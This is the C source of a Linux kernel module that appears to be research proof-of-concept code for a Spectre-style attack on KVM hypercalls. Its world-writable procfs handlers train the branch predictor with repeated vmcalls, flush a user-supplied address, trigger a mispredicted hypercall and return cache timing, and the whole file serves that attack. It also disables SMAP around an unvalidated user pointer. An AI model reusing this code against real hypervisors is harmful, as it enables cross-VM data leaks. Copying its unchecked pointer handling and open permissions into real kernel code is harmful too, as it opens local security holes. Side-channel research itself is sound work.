// You can only do hypercalls from ring 0, so this has to be a kernel module
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/types.h>

#include <linux/kvm_para.h>

#include "hypercall.h"
#include "timing.h"

static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_self_send_ipi;
static struct proc_dir_entry *proc_send_ipi;
static struct proc_dir_entry *proc_sched_yield;

static inline __attribute__((always_inline)) void disable_smap(void) {
#if (HAS_SMAP + 0)
  __asm__ volatile("stac" ::: "cc");
#endif
}

static inline __attribute__((always_inline)) void enable_smap(void) {
#if (HAS_SMAP + 0)
  __asm__ volatile("clac" ::: "cc");
#endif
}

static inline __attribute__((always_inline)) void confuse_branch_predictor(void) {
  // Bring the branch predictor into a known state of history
  asm volatile("movq $0, %%rcx\n"
               "cmpq $0, %%rcx\n"
               ".rept 150\n" // TODO: optimize this, maybe 150 is too much/too little?
               "je 1f\n"
               "1:\n"
               ".endr\n" ::
                   : "rcx", "cc");
}

static noinline void vmcall1(int hypercall_number, unsigned long rbx) {
  confuse_branch_predictor();
  asm volatile("vmcall" : "+a"(hypercall_number), "+b"(rbx));
}

static noinline void vmcall4(int hypercall_number, unsigned long rbx, unsigned long rcx, unsigned long rdx,
                             unsigned long rsi) {
  confuse_branch_predictor();
  asm volatile("vmcall" : "+a"(hypercall_number), "+b"(rbx), "+c"(rcx), "+d"(rdx), "+S"(rsi));
  pr_info("vmcall4 result: %ld\n", hypercall_number);
}

static ssize_t self_send_ipi_write(struct file *file, const char __user *buff, size_t len, loff_t *off) {
  struct self_send_ipi_hypercall opts;

  // Make sure that only the size of the struct is written
  if (len != sizeof(opts)) {
    return -EINVAL;
  }

  // Copy the buffer from the user
  if (copy_from_user(&opts, buff, sizeof(opts))) {
    return -EFAULT;
  }

  for (int i = 0; i < opts.repeat; i++)
    vmcall4(KVM_HC_SEND_IPI, 1, 0, opts.min, 0);

  return len;
}

static ssize_t send_ipi_write(struct file *file, const char __user *buff, size_t len, loff_t *off) {
  struct send_ipi_hypercall opts;

  // Make sure that only the size of the struct is written
  if (len != sizeof(opts)) {
    return -EINVAL;
  }

  // Copy the buffer from the user
  if (copy_from_user(&opts, buff, sizeof(opts))) {
    return -EFAULT;
  }

  int type = KVM_HC_SEND_IPI;

  // Take the correct branch twice, so the 2-bit saturating counter from the branch predictor
  // will be at least in the weakly taken/strongly taken state
  //
  //                    taken           taken        taken
  //       ┌─►┌─────────┬────►┌─────────┬────►┌──────┬────►┌────────┬──┐
  //   not │  │strongly │     │ weakly  │     │weakly│     │strongly│  │taken
  //  taken│  │not taken│     │not taken│     │taken │     │ taken  │  │
  //       └──┴─────────┘◄────┴─────────┘◄────┴──────┘◄────┴────────┘◄─┘
  //                      not             not          not
  //                     taken           taken        taken
  //
  vmcall4(type, opts.real.mask_low, opts.real.mask_high, opts.real.min, opts.real.icr.raw_icr);
  vmcall4(type, opts.real.mask_low, opts.real.mask_high, opts.real.min, opts.real.icr.raw_icr);

  // Do the mispredicted vmcall!
  disable_smap();
  __asm__ volatile("clflush (%0)\nmfence" ::"r"(opts.ptr));
  enable_smap();

  vmcall4(type, opts.mispredicted.mask_low, opts.mispredicted.mask_high, opts.mispredicted.min,
          opts.mispredicted.icr.raw_icr);

  disable_smap();
  size_t time = access_time(opts.ptr);
  enable_smap();

  return time;
}

static ssize_t sched_yield_write(struct file *file, const char __user *buff, size_t len, loff_t *off) {
  struct sched_yield_hypercall opts;

  // Make sure that only the size of the struct is written
  if (len != sizeof(opts)) {
    return -EINVAL;
  }

  // Copy the buffer from the user
  if (copy_from_user(&opts, buff, sizeof(opts))) {
    return -EFAULT;
  }

  int type = KVM_HC_SCHED_YIELD;
  vmcall1(type, opts.current_cpu_id);
  vmcall1(type, opts.current_cpu_id);

  // Do the mispredicted vmcall!
  disable_smap();
  __asm__ volatile("clflush (%0)\nmfence" ::"r"(opts.ptr));
  enable_smap();

  vmcall1(type, opts.speculated_cpu_id);

  disable_smap();
  size_t time = access_time(opts.ptr);
  enable_smap();

  return time;
}

static const struct proc_ops send_ipi_fops = {
    .proc_write = send_ipi_write,
};

static const struct proc_ops self_send_ipi_fops = {
    .proc_write = self_send_ipi_write,
};

static const struct proc_ops sched_yield_fops = {
    .proc_write = sched_yield_write,
};

static int __init hypercall_main(void) {
  const char *procfs_root_name = "hypercall";
  const char *procfs_ipi_name = "send_ipi";
  const char *procfs_self_ipi_name = "self_send_ipi";
  const char *procfs_sched_yield_name = "sched_yield";

  // Initialize the root procfs entry
  proc_root = proc_mkdir(procfs_root_name, NULL);
  if (!proc_root) {
    proc_remove(proc_root);
    pr_alert("hypercall: Error: Could not initialize /proc/%s\n", procfs_root_name);
    return -ENOMEM;
  }

  // Initialize the send_ipi entry
  proc_send_ipi = proc_create(procfs_ipi_name, 0666, proc_root, &send_ipi_fops);
  if (!proc_send_ipi) {
    proc_remove(proc_send_ipi);
    proc_remove(proc_root);
    pr_alert("hypercall: Error:Could not initialize /proc/%s/%s\n", procfs_root_name, procfs_ipi_name);
    return -ENOMEM;
  }

  // Initialize the sched_yield entry
  proc_sched_yield = proc_create(procfs_sched_yield_name, 0666, proc_root, &sched_yield_fops);
  if (!proc_sched_yield) {
    proc_remove(proc_sched_yield);
    proc_remove(proc_send_ipi);
    proc_remove(proc_root);
    pr_alert("hypercall: Error:Could not initialize /proc/%s/%s\n", procfs_root_name,
             procfs_sched_yield_name);
    return -ENOMEM;
  }

  // Initialize the self send_ipi entry
  proc_self_send_ipi = proc_create(procfs_self_ipi_name, 0666, proc_root, &self_send_ipi_fops);
  if (!proc_self_send_ipi) {
    proc_remove(proc_self_send_ipi);
    proc_remove(proc_sched_yield);
    proc_remove(proc_send_ipi);
    proc_remove(proc_root);
    pr_alert("hypercall: Error:Could not initialize /proc/%s/%s\n", procfs_root_name, procfs_self_ipi_name);
    return -ENOMEM;
  }

  pr_info("hypercall: procfs entries created\n");

  return 0;
}

static void __exit hypercall_exit(void) {
  proc_remove(proc_self_send_ipi);
  proc_remove(proc_sched_yield);
  proc_remove(proc_send_ipi);
  proc_remove(proc_root);
  pr_info("hypercall: procfs entries removed\n");
}

module_init(hypercall_main);
module_exit(hypercall_exit);
MODULE_LICENSE("GPL");
